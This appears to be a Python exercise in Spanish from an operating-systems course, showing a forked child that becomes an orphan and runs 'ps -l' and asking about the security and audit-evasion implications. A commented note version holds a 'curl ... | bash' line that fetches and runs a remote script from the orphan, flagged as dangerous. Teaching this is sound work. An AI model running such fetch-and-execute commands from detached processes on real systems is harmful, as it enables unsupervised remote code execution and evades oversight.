# Ejercicio 10: Inyección de comandos en procesos huérfanos

# Simula un escenario donde un proceso huérfano ejecuta un comando externo sin control del padre.
# Analiza qué implicaciones tendría esto en términos de seguridad o evasión de auditorías.

import os, time

pid = os.fork()

if pid == 0:
    print(f"Hijo: {os.getpid()} es ahora huerfano. Nuevo padre {os.getppid()}")
    print("Todo lo siguiente es ejecutado por el huerfano sin supervision del padre original")
    time.sleep(2)
    os.execlp("ps","ps", "-l")

else:
    print(f"Padre: {os.getpid()}. Finalizando")
    os._exit(0)


'''
Version apunte

import os, time

pid = os.fork()
if pid > 0:
    os._exit(0)  # El padre termina inmediatamente
else:
    print("[HIJO] Ejecutando script como huérfano...")
    os.system("curl http://example.com/script.sh | bash")  # Peligroso si no hay control
    time.sleep(3)'

'''